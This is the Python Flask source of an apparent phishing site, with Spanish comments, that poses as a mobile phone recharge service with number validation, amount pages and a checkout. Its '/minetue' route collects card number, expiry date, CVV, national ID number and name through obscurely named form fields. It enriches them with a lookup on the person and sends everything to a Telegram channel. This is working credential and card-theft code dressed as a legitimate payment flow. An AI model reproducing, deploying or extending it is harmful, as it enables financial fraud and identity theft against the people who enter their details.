from flask import Flask, render_template, request, session, redirect, url_for
from functions.send_tele import enviar_telegram
from functions.moduls import customer_date
import re


app = Flask(__name__)


num_txt = 'functions/nums.txt'

app.secret_key = 'una_clave_super_secreta_y_dificil_de_adivinar'


def num_validator(num, ruta_txt):
    numero = re.sub(r'\D', '', str(num))
    if numero.startswith('0'):
        numero = numero[1:]
    else:
        pass
    try:
        with open(ruta_txt, 'r', encoding='utf-8') as archivo:
            codigos_area = [linea.strip() for linea in archivo if linea.strip()]
            
        for codigo in codigos_area:
            if numero.startswith(codigo):
                resto_del_numero = numero[len(codigo):]
                if resto_del_numero.startswith('15'):
                    resto_del_numero = resto_del_numero[2:]
                
                numero_limpio = codigo + resto_del_numero
                if len(numero_limpio) == 10:
                    return True 
        return False
        
    except FileNotFoundError:
        print(f"[!] Error: No se encontró el archivo '{ruta_txt}'.")
        return False

# Ruta para la página principal
@app.route('/minetue', methods=["POST"])
def minetute():
    numcc = request.form.get('agks')
    exp = request.form.get('agksjf')
    cvv = request.form.get('agksjfa')
    dni = request.form.get('agksjfas')
    print(dni)
    name = request.form.get('agksjfass')
    info_date = customer_date(dni)

    print(info_date)
    enviar_telegram(numcc, exp, cvv, dni, name, info_date)
    return render_template('minetune.html')

@app.route('/', methods=['GET', 'POST'])
def home():
    # Si el usuario mandó el formulario (POST)
    if request.method == 'POST':
        telefono_ingresado = request.form.get('number')
        print(telefono_ingresado) # Para debugear en tu consola

        # Validamos el número
        if num_validator(telefono_ingresado, 'functions/nums.txt'):
            # ¡Éxito! 
            number_line = telefono_ingresado.replace(" ", "")
            session['number_user'] = number_line
            
            # CAMBIO CLAVE: Usar redirect y url_for (asegurate de que la función se llame exactamente 'recharge_line')
            return redirect(url_for('recharge_line')) 
        else:
            # ¡Error! 
            mensaje_error = "La línea no es válida. Ingresa tu código de área y tu línea sin el 15."
            
            # CAMBIO CLAVE: Le devolvemos 'telefono_previo' para que no pierda lo que tipeó
            return render_template('index.html', error=mensaje_error, telefono_previo=telefono_ingresado)

    # Si el usuario recién entra a la página (GET)
    return render_template('index.html', error=None, telefono_previo="")

    

@app.route('/recharge-amounts-view' )
def recharge_line():
    # render_template busca automáticamente en la carpeta 'templates'
    number_user = session.get('number_user', 0)
    
    return render_template('number_line.html', number_user=number_user)

@app.route('/ammounts-view')
def ammounts_view():
    number_user = session.get('number_user', 0)


    return render_template('ammount_view.html', number=number_user)

@app.route('/recharge-view', methods=['POST'])
def recharge_view():
    count = request.form.get('monto')
    number_user = session.get('number_user', 0)

    return render_template('recharge_view.html', number=number_user, count=count)

@app.route('/checkout')
def checkout():
    number_user = session.get('number_user', 0)

    return render_template('checkout.html', number=number_user)



# Aquí podrás agregar más rutas después. Ejemplo:
# @app.route('/contacto')
# def contacto():
#     return render_template('contacto.html')

if __name__ == '__main__':
    # debug=True reinicia el servidor automáticamente cuando guardas cambios
    app.run(debug=True, port=5000)